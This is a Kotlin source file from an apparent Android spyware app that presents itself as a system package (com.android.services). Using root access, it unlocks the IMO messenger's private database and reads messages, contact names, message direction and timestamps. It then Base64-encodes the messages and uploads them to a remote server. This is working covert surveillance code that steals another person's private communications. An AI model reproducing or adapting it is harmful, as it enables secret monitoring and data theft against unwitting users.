package com.android.services.logs.collectors.im

import android.content.Context
import android.database.sqlite.SQLiteDatabase
import com.android.services.db.entities.ImoRooted
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.NodeServerOneApi
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.RootPermission.setPermissionImo
import com.android.services.util.RootPermission.setPermissionImoDatabase
import com.android.services.util.logException
import com.android.services.util.logVerbose
import org.json.JSONObject
import java.io.File
import java.util.*

class ImoRootedCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    override fun uploadLogs() {
        if (AppConstants.syncImo) {
            try {
                val imoList = retrieveIMOMessages(context, localDatabaseSource)
                if (imoList.isNotEmpty()) {
                    val startDate = imoList[imoList.size - 1].date
                    val endDate = imoList[0].date
                    val mImoSender = RemoteServerHelper(
                        context,
                        AppConstants.IMO_ROOTED_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi,
                        startDate = startDate,
                        endDate = endDate
                    )
                    mImoSender.upload(imoList)
                }
            } catch (e: Exception) {
                logException(
                    "${AppConstants.IMO_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                    throwable = e
                )
            }
        } else {
            logVerbose("${AppConstants.IMO_ROOTED_TYPE} Sync is Off")
        }
    }

    companion object {

        private const val imoFolder = "com.imo.android.imoim"
        private const val imoDB = "imofriends.db"
        private var databasesList = arrayListOf<String>()

        private fun retrieveIMOMessages(
            context: Context,
            localDatabaseSource: LocalDatabaseSource,
        ): List<ImoRooted> {
            var imoLogs: MutableList<ImoRooted> = ArrayList()

            try {
                setPermissionImoDatabase()
                val databaseDir = File(AppConstants.IMO_DB_PATH)
                if (databaseDir.exists()) {
                    val files = databaseDir.listFiles() ?: emptyArray()
                    files.forEach { inFile ->
                        if (inFile.isFile) {
                            val fileName = inFile.name
                            if (fileName.contains("imofriends") && !fileName.contains("journal")) {
                                if (!databasesList.contains(fileName)) databasesList.add(fileName)
                            }
                        }
                    }
                }

                if (databasesList.size > 0) {
                    for (i in databasesList.indices) {
                        val dbName = databasesList[i]
                        val imoDatabase = ("/data/data/"
                                + imoFolder
                                + "/databases/"
                                + dbName)
                        setPermissionImo(dbName)

                        val selection: String?
                        val selectionArgs: Array<String>?
                        val since: String
                        val maxTimeStamp = localDatabaseSource.selectImoRootedMaxTimeStamp() ?: "0"
                        since = maxTimeStamp.toString()

                        if (since.isNotEmpty()) {
                            selection = String.format("%s > ?", "timestamp")
                            selectionArgs = arrayOf(since)
                        } else {
                            selection = null
                            selectionArgs = null
                        }
                        val database =
                            SQLiteDatabase.openDatabase(imoDatabase,
                                null,
                                SQLiteDatabase.OPEN_READONLY)
                        val cursor = database.query("messages",
                            null,
                            selection,
                            selectionArgs,
                            null,
                            null,
                            "timestamp DESC")
                        while (cursor.moveToNext()) {
                            try {
                                val imoMessage = JSONObject()
                                val timeStamp = cursor.getString(cursor.getColumnIndex("timestamp"))
                                val realTimeStamp = timeStamp.toLong() / 1000000
                                val messageId = cursor.getString(cursor.getColumnIndex("_id"))
                                val conversationId = cursor.getString(cursor.getColumnIndex("buid"))
                                imoMessage.put("conversationId", conversationId)
                                var conversationName = ""
                                val cur = database.query("friends", arrayOf("name"),
                                    "buid=?", arrayOf(conversationId), null, null, null)
                                if (cur.moveToFirst()) {
                                    conversationName = cur.getString(0)
                                }
                                cur.close()
                                val message =
                                    cursor.getString(cursor.getColumnIndex("last_message"))
                                var type = cursor.getString(cursor.getColumnIndex("message_type"))
                                type = if (type == "0") "outgoing" else "incoming"

                                val imoRooted = ImoRooted()
                                imoRooted.apply {
                                    this.conversationId = conversationId
                                    this.conversationName = conversationName
                                    this.type = type
                                    this.message = AppUtils.convertStringToBase64(message)
                                    this.messageDatetime =
                                        AppUtils.formatDate(realTimeStamp.toString())
                                    this.messageId = messageId
                                    this.timeStamp = realTimeStamp
                                    this.date = AppUtils.getDate(realTimeStamp)
                                    this.status = 0
                                }
                                imoLogs.add(imoRooted)
                            } catch (e: Exception) {
                                logVerbose(
                                    "${AppConstants.IMO_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                                    throwable = e
                                )
                            }
                        }
                        cursor.close()
                        database.close()
                        logVerbose("${AppConstants.IMO_ROOTED_TYPE} rooted list = $imoLogs")
                        if (imoLogs.isNotEmpty())
                            localDatabaseSource.insertImoRooted(imoLogs)
                        localDatabaseSource.selectImoRooted {
                            imoLogs = it as ArrayList<ImoRooted>
                        }
                        logVerbose("${AppConstants.IMO_ROOTED_TYPE} selected list = $imoLogs")
                    }
                }
            } catch (e: Exception) {
                logVerbose(
                    "${AppConstants.IMO_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                    throwable = e
                )
            }
            return imoLogs
        }
    }

}